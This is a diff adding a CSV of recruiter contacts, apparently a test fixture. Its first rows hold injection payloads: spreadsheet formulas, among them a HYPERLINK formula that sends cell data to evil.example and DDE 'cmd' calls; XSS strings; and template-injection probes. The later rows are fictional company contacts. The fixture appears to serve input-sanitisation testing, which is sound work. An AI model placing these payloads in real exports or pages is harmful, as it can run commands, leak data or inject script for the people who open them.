@@ -1,0 +1,56 @@
+Company,Contact Person,Designation,City,Website,Open Position
+"=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")","=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")","=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")","=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")",https://hostile0.example,"=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"
++cmd|' /C calc'!A0,+cmd|' /C calc'!A0 Kumar,+cmd|' /C calc'!A0,Pune,https://hostile1.example,+cmd|' /C calc'!A0
+-2+3+cmd|' /C notepad'!A0,-2+3+cmd|' /C notepad'!A0,-2+3+cmd|' /C notepad'!A0,Pune,https://hostile2.example,-2+3+cmd|' /C notepad'!A0
+@SUM(1+9)*cmd|' /C calc'!A0,@SUM(1+9)*cmd|' /C calc'!A0 Kumar,@SUM(1+9)*cmd|' /C calc'!A0,@SUM(1+9)*cmd|' /C calc'!A0,https://hostile3.example,@SUM(1+9)*cmd|' /C calc'!A0
+	=1+1,	=1+1,	=1+1,Pune,https://hostile4.example,	=1+1
+=1+1,=1+1 Kumar,=1+1,Pune,https://hostile5.example,=1+1
+"
+=1+1","
+=1+1","
+=1+1","
+=1+1",https://hostile6.example,"
+=1+1"
+＝1+1,＝1+1 Kumar,＝1+1,Pune,https://hostile7.example,＝1+1
+＋1+1,＋1+1,＋1+1,Pune,https://hostile8.example,＋1+1
+－1+1,－1+1 Kumar,－1+1,－1+1,https://hostile9.example,－1+1
+＠SUM(A1),＠SUM(A1),＠SUM(A1),Pune,https://hostile10.example,＠SUM(A1)
+Acme;=1+1,Acme;=1+1 Kumar,Acme;=1+1,Pune,https://hostile11.example,Acme;=1+1
+"Acme,=1+1","Acme,=1+1","Acme,=1+1","Acme,=1+1",https://hostile12.example,"Acme,=1+1"
+"Acme""=1+1","Acme""=1+1 Kumar","Acme""=1+1",Pune,https://hostile13.example,"Acme""=1+1"
+<script>alert('xss')</script>,<script>alert('xss')</script>,<script>alert('xss')</script>,Pune,https://hostile14.example,<script>alert('xss')</script>
+"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> Kumar","""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)>",https://hostile15.example,"""><img src=x onerror=alert(1)>"
+</title><svg onload=alert(1)>,</title><svg onload=alert(1)>,</title><svg onload=alert(1)>,Pune,https://hostile16.example,</title><svg onload=alert(1)>
+javascript:alert(1),javascript:alert(1) Kumar,javascript:alert(1),Pune,https://hostile17.example,javascript:alert(1)
+' onmouseover='alert(1),' onmouseover='alert(1),' onmouseover='alert(1),' onmouseover='alert(1),https://hostile18.example,' onmouseover='alert(1)
+{{7*7}}${7*7},{{7*7}}${7*7} Kumar,{{7*7}}${7*7},Pune,https://hostile19.example,{{7*7}}${7*7}
+Pragati Foods LLP,Manoj Rao,HRBP,Hyderabad,https://pragati-foods.example,Telecaller
+Cobalt Motors,Saanvi Nair,Recruitment Manager,Gurgaon,https://cobalt-motors.example,Telecaller
+Saffron Staffing Pvt Ltd,Arjun Saxena,Recruitment Manager,Pune,https://saffron-staffing.example,Telecaller
+Indus Motors Private Limited,Bablu Iyer,Talent Acquisition Manager,Pune,https://indus-motors.example,Telecaller
+Nimbus Staffing,Diya Saxena,HR Executive,Kolkata,https://nimbus-staffing.example,Telecaller
+Indus Healthcare,Diya Singh,TA Lead,Noida,https://indus-health.example,Telecaller
+Lotus Staffing Pvt. Ltd.,Farhan Khan,HRBP,Gurgaon,https://lotus-staffing.example,Telecaller
+Ganga Motors Ltd.,Tanvi Patil,Head - People,Bengaluru,https://ganga-motors.example,Telecaller
+Ganga Foods LLP,Kiran Kulkarni,HR Executive,Noida,https://ganga-foods.example,Telecaller
+Ganga Logistics Pvt Ltd,Vivaan Khan,Talent Acquisition Manager,Noida,https://ganga-logistics.example,Telecaller
+Nimbus Logistics Pvt Ltd,Divya Joshi,HR Head,Gurgaon,https://nimbus-logistics.example,Telecaller
+Kaveri Logistics LLP,Ishaan Reddy,Recruitment Manager,Kolkata,https://kaveri-logistics.example,Telecaller
+Vista Healthcare,Saanvi Khan,Founder & CEO,Chennai,https://vista-health.example,Telecaller
+Vayu Motors Pvt Ltd,Suresh Rao,Founder & CEO,Bengaluru,https://vayu-motors.example,Telecaller
+Monsoon Logistics Pvt. Ltd.,Saanvi Nair,TA Lead,Gurgaon,https://monsoon-logistics.example,Telecaller
+Monsoon BPO Services Ltd.,Ananya Das,HR Head,Kolkata,https://monsoon-bpo.example,Telecaller
+Orbit BPO Services Private Limited,Pooja Khan,TA Lead,Noida,https://orbit-bpo.example,Telecaller
+Orbit Fintech LLP,Tanvi Nair,HR Head,Bengaluru,https://orbit-fintech.example,Telecaller
+Cobalt Logistics,Vikram Khan,Head - People,Hyderabad,https://cobalt-logistics.example,Telecaller
+Vista BPO Services Ltd.,Pooja Bhatt,TA Lead,Kolkata,https://vista-bpo.example,Telecaller
+Sarvam Logistics,Vivaan Reddy,Founder & CEO,Pune,https://sarvam-logistics.example,Telecaller
+Anant Foods Private Limited,Bablu Singh,Co-Founder,Gurgaon,https://anant-foods.example,Telecaller
+Cobalt BPO Services Pvt. Ltd.,Rahul Saxena,Talent Acquisition Manager,Chennai,https://cobalt-bpo.example,Telecaller
+Saffron Foods Ltd.,Pooja Khan,TA Lead,Hyderabad,https://saffron-foods.example,Telecaller
+Lotus Motors LLP,Vikram Patil,Director HR,Hyderabad,https://lotus-motors.example,Telecaller
+Orbit Motors Private Limited,Pooja Sharma,HR Head,Gurgaon,https://orbit-motors.example,Telecaller
+Kaveri Staffing,Suresh Rao,Talent Acquisition Manager,Chennai,https://kaveri-staffing.example,Telecaller
+Orbit Retail Ltd.,Rohan Pillai,Recruitment Manager,Hyderabad,https://orbit-retail.example,Telecaller
+Saffron Retail Ltd.,Lakshmi Menon,Head - People,Chennai,https://saffron-retail.example,Telecaller
+Prakash Logistics Private Limited,Vivaan Reddy,Talent Acquisition Manager,Hyderabad,https://prakash-logistics.example,Telecaller
